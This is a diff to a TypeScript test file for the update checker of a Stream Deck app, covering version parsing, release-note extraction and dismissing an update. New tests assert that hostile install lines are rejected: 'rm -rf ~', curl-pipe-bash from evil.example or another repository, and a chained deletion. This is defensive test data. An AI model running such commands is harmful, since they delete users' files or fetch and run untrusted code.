@@ -5,7 +5,7 @@
 import assert from 'node:assert/strict';
 import http from 'node:http';
 
-const { isNewer, parseVersion, releaseFrom } = await import('../src/shared/updates.js');
+const { isNewer, notesFrom, parseVersion, releaseFrom } = await import('../src/shared/updates.js');
 const { UpdateChecker } = await import('../src/main/updates.js');
 
 let failures = 0;
@@ -42,7 +42,7 @@ await check('a developer install between releases counts as the release it follo
 
 await check("an answer names a release only with a plain tag and this repository's page for exactly that tag", () => {
   const page = 'https://github.com/juicetheforce/deckhand/releases/tag/v0.7.1';
-  assert.deepEqual(releaseFrom({ tag_name: 'v0.7.1', html_url: page }), { version: 'v0.7.1', url: page });
+  assert.deepEqual(releaseFrom({ tag_name: 'v0.7.1', html_url: page }), { version: 'v0.7.1', url: page, whatsNew: [], updateLine: null });
   assert.equal(releaseFrom({ tag_name: 'v0.7.1', html_url: 'https://evil.example/releases/tag/v0.7.1' }), null);
   assert.equal(releaseFrom({ tag_name: 'v0.7.1', html_url: 'https://github.com/juicetheforce/deckhand/releases/tag/v0.7.2' }), null);
   assert.equal(releaseFrom({ tag_name: 'v0.7.1-rc1', html_url: 'https://github.com/juicetheforce/deckhand/releases/tag/v0.7.1-rc1' }), null);
@@ -61,12 +61,13 @@ const server = http.createServer((_req, res) => {
 await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
 const url = `http://127.0.0.1:${(server.address() as { port: number }).port}/releases/latest`;
 
-function checker(options: { version?: string | null; enabled?: boolean; url?: string | null } = {}) {
+function checker(options: { version?: string | null; enabled?: boolean; url?: string | null; dismissed?: string } = {}) {
   const seen: string[] = [];
   const it = new UpdateChecker({
     url: options.url === undefined ? url : options.url,
     version: () => (options.version === undefined ? 'v0.7.1' : options.version),
     enabled: async () => options.enabled ?? true,
+    dismissed: async () => options.dismissed ?? null,
     onChange: (state) => seen.push(state.status),
   });
   return { it, seen };
@@ -87,7 +88,7 @@ await check('a newer release: available, with its version and page', async () =>
   const before = requests;
   await it.check();
   assert.equal(requests, before + 1);
-  assert.deepEqual(it.state(), { enabled: true, status: 'available', latest: 'v0.8.0', url: 'https://github.com/juicetheforce/deckhand/releases/tag/v0.8.0' });
+  assert.deepEqual({ status: it.state().status, latest: it.state().latest, url: it.state().url, installed: it.state().installed, hidden: it.state().hidden }, { status: 'available', latest: 'v0.8.0', url: 'https://github.com/juicetheforce/deckhand/releases/tag/v0.8.0', installed: 'v0.7.1', hidden: false });
   assert.deepEqual(seen, ['checking', 'available']);
 });
 
@@ -128,7 +129,7 @@ await check('an error, or an answer that names no release: failed, and nothing s
   answer = { status: 500, body: 'oops' };
   const failed = checker();
   await quietly(() => failed.it.check());
-  assert.deepEqual(failed.it.state(), { enabled: true, status: 'failed', latest: null, url: null });
+  assert.deepEqual({ enabled: failed.it.state().enabled, status: failed.it.state().status, latest: failed.it.state().latest, url: failed.it.state().url }, { enabled: true, status: 'failed', latest: null, url: null });
   answer = { status: 200, body: JSON.stringify({ tag_name: 'v9.0.0', html_url: 'https://elsewhere.example/' }) };
   const odd = checker();
   await quietly(() => odd.it.check());
@@ -140,11 +141,42 @@ await check('turned off forgets what was found; turned on asks again at once', a
   const { it } = checker();
   await it.check();
   await it.setEnabled(false);
-  assert.deepEqual(it.state(), { enabled: false, status: 'off', latest: null, url: null });
+  assert.deepEqual({ enabled: it.state().enabled, status: it.state().status, latest: it.state().latest, url: it.state().url }, { enabled: false, status: 'off', latest: null, url: null });
   const before = requests;
   await it.setEnabled(true);
   assert.equal(requests, before + 1);
   assert.equal(it.state().status, 'available');
+});
+
+await check("a release's notes: the first three lines of What's new as plain text, and its own update line", () => {
+  const LINE = 'curl -fsSL https://github.com/juicetheforce/deckhand/releases/latest/download/install.sh | bash';
+  const notes = `**What's new**\n\n- **Stream Decks sleep.** They go dark.\n- A **Sleep all** key\n- \`Label\` size\n- A fourth line\n\n\nInstall or update: \`${LINE}\`. SHA256SUMS lets the installer check it.\n`;
+  assert.deepEqual(notesFrom(notes), { whatsNew: ['Stream Decks sleep. They go dark.', 'A Sleep all key', 'Label size'], updateLine: LINE });
+  assert.deepEqual(notesFrom(`**What's new**\n\n- One line\n\n\nInstall or update: \`${LINE}\`.`).whatsNew, ['One line']);
+  assert.deepEqual(notesFrom('## What’s new\n\n- Heading style\n\n## Fixed\n\n- Not this').whatsNew, ['Heading style']);
+  assert.deepEqual(notesFrom('Nothing recognisable here.'), { whatsNew: [], updateLine: null });
+  assert.deepEqual(notesFrom(undefined), { whatsNew: [], updateLine: null });
+});
+
+await check('the panel never offers a command that is not the release install line', () => {
+  for (const evil of ['rm -rf ~', 'curl -fsSL https://evil.example/install.sh | bash', 'curl -fsSL https://github.com/juicetheforce/deckhand/releases/latest/download/install.sh | bash; rm -rf ~', 'curl -fsSL https://github.com/someone/deckhand/releases/latest/download/install.sh | bash']) {
+    assert.equal(notesFrom(`Install or update: \`${evil}\`.`).updateLine, null, evil);
+  }
+});
+
+await check('"Not now": hidden for that version, and a newer one brings it back', async () => {
+  answer = { status: 200, body: JSON.stringify({ tag_name: 'v0.8.0', html_url: 'https://github.com/juicetheforce/deckhand/releases/tag/v0.8.0' }) };
+  const same = checker({ dismissed: 'v0.8.0' });
+  await same.it.check();
+  assert.equal(same.it.state().status, 'available');
+  assert.equal(same.it.state().hidden, true);
+  const older = checker({ dismissed: 'v0.7.5' });
+  await older.it.check();
+  assert.equal(older.it.state().hidden, false);
+  const live = checker();
+  await live.it.check();
+  live.it.hide();
+  assert.equal(live.it.state().hidden, true);
 });
 
 server.close();
